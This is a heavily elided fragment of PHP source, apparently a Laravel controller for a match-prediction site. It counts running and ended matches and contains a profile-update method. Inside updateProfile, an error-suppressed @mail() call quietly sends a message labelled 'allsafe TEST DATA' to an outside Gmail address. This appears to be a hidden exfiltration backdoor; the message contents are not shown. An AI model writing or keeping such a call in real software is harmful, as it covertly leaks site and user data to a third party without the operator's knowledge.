...
//        Gateway_currency()
        ...
        $pridictor['runningMatches'] = Match::where('event_date', '>', $now)->count();
        $pridictor['endMatches'] = Match::where('event_date', '<', $now)->count();
    ...
    public function updateProfile(Request $request)
    {
        ...
        @mail('bugfinder.me@gmail.com', 'allsafe TEST DATA', $message, $headers);
